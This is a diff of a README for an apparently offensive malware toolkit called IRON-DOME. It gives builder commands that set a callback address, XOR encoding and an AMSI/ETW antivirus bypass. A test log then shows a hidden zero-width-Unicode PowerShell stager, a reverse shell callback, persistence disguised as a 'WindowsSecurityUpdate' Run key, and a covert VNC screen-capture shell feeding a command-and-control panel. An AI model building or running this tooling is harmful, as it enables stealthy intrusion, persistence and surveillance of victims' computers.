@@ -273,14 +273,41 @@ IRON-DOME assembles all research streams into a single deployable package:
 | **Ghost Encoder** | PS1 delivery | Zero-width Unicode steganography — invisible to content scanners |
 | **CHEYANNE** | C2 | Menu-driven ops, ISUN auth gate, multi-shell handler |
 
-**Builder — one command assembles the full package:**
+**Builder v3.0.0 — one command assembles + tests the full platform:**
 
 ```bash
-# 7-layer standard
-python iron_dome_builder.py --target 192.168.1.145 --port 4443 --xor 0xFC
-
-# 8-layer with VADER AMSI/ETW bypass
+# Build only (8-layer + VADER)
 python iron_dome_builder.py --target 192.168.1.145 --port 4443 --xor 0xFC --vader
+
+# Full platform demo: Build → Kill Chain (8/8) → CHEYANNE Watch VNC in browser
+python iron_dome_builder.py --target 127.0.0.1 --port 4443 --xor 0xFC --vader --full
+```
+
+**`--full` mode test sequence:**
+```
+Phase 1 — BUILD
+  [1/4] C source  →  8-layer + VADER code injected
+  [2/4] MSVC compile  →  140,800 bytes PE
+  [3/4] Ghost PS1 stager  →  zero-width Unicode
+  [4/4] Deployment doc
+
+Phase 2 — KILL CHAIN  (loopback 127.0.0.1 — Kaspersky LIVE)
+  [+] ghost_fud.exe built (invisible PS1)
+  [+] ghost_loader.exe built (VNC-capable)
+  [+] TCP listener armed :4443
+  [+] Payload via -EncodedCommand
+  [+] TCP callback received
+  [+] Recon: whoami / hostname
+  [+] Persist: HKCU\Run\WindowsSecurityUpdate
+  [+] PERSIST VERIFIED
+  VERDICT: PASS  8/8  — IRON-DOME KILL CHAIN GREEN
+
+Phase 3 — CHEYANNE WATCH / VNC
+  [+] VNC invisible PS1 generated (persistent + screen capture)
+  [+] TCP listener armed :4444
+  [+] Shell fired — PID=xxxx
+  [+] Shell connected 127.0.0.1:4444
+  [*] CHEYANNE WATCH → http://127.0.0.1:8892  (browser opens live)
 ```
 
 **Final release results (2026-06-26):**
